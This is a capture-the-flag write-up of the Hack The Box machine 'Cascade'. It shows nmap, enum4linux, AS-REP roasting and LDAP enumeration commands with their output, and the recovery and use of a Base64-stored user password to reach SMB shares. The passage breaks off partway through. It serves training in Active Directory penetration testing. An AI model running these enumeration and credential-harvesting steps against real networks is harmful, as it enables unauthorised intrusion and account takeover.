---
layout: post
title: "HTB: Cascade"
tags: htb windows
---
Cascade was a mind-blowing box that involved no exploits and had all to do with studious enumeration. Let's go.

### Recce
Do your usual nmap scan and see that there's nothing much interesting.
```
# Nmap 7.80 scan initiated Mon Apr  6 23:14:13 2020 as: nmap -sC -sV -oN initial.txt -v -Pn cascade.htb
Nmap scan report for cascade.htb (10.10.10.182)
Host is up (0.33s latency).
Not shown: 986 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m07s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-07T06:16:43
|_  start_date: 2020-04-06T06:15:05                                                                     
                                                                                                        
Read data files from: /usr/bin/../share/nmap                                                            
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .          
# Nmap done at Mon Apr  6 23:18:11 2020 -- 1 IP address (1 host up) scanned in 238.27 seconds
```
The ports that stand out are 53 (DNS), 88 (Kerberos), 135/445 (SMB), 389/3268 (LDAP). Let's take a closer look at them.

### Port 445 (SMB)
Do the usual `enum4linux` scan and see that we get a bunch of usernames:
```
 ============================ 
|    Users on cascade.htb    |
 ============================ 
index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull     Name: Adrian Turnbull   Desc: (null)
index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc    Desc: (null)
index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson       Name: Ben Hanson        Desc: (null)
index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc      Name: BackupSvc Desc: (null)
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest      Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman       Name: David Burman      Desc: (null)
index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe        Name: Edward Crowe      Desc: (null)
index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft        Name: Ian Croft Desc: (null)
index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen        Name: Joseph Allen      Desc: (null)
index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand     Name: John Goodhand     Desc: (null)
index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield    Name: James Wakefield   Desc: (null)
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson     Name: Ryan Thompson     Desc: (null)
index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson      Name: Stephanie Hickson Desc: (null)
index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith        Name: Steve Smith       Desc: (null)
index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util   Name: Util      Desc: (null)
```
We can save those usernames - they will come in handy since there's Kerberos and LDAP on the box. Prepare a list of usernames like this:
```
CascGuest
arksvc
s.smith
r.thompson
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
util
```
### Port 88 (Kerberos)
Now we could try seeing if we can do AS-REP roasting attacks with just the usernames with `impacket`'s `GetNPUsers.py` module:
```
python GetNPUsers.py CASCADE/ -usersfile ~/htb/cascade/enum/users -format hashcat -output ~/htb/cascade/hashes.asperoast -dc-ip cascade.htb
Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
We see that didn't work. Let's move on to LDAP and see if we can glean any information from the users' properties.

### Port 189 (LDAP)
Now at this part we can take a leaf out of IppSec's book from his [Ypuffy video to conduct LDAP enumeration](https://www.youtube.com/watch?v=UoB-J-eDvrg):
```
ldapsearch -x -h cascade.htb -s sub -b 'DC=cascade,DC=local' > ldap3
```
Then `grep` the output for key words like `PWD`:
```
less ldap3 | grep Pwd
maxPwdAge: -9223372036854775808
minPwdAge: 0
minPwdLength: 5
badPwdCount: 0
maxPwdAge: -37108517437440
minPwdAge: 0
minPwdLength: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
cascadeLegacyPwd: clk0bjVldmE=
```
Well, whaddayaknow, we got ourselves a password :)

### SMB shares as r.thompson
Take a closer look at our `ldap3` output and see that the password belongs to `r.thompson`. But first, notice that it's encoded in Base64, so decode it:
```
$ echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```
Now we got the plaintext password, let's try to access SMB shares as `r.thompson`:
```
$ smbclient -L \\cascade.htb -U r.thompson%rY4n5eva

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
Now at this point, it helps to recall some details about `r.thompson`. If we looked back at the `enum4linux` results and `grep`'ed for `r.thompson`, we'll see that `r.thompson` is a member of the `IT` group:
```
$ cat initial.txt | grep r.thompson
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson     Name: Ryan Thompson     Desc: (null)
user:[r.thompson] rid:[0x455]
Group 'IT' (RID: 1113) has member: CASCADE\r.thompson
Group 'Domain Users' (RID: 513) has member: CASCADE\r.thompson
```
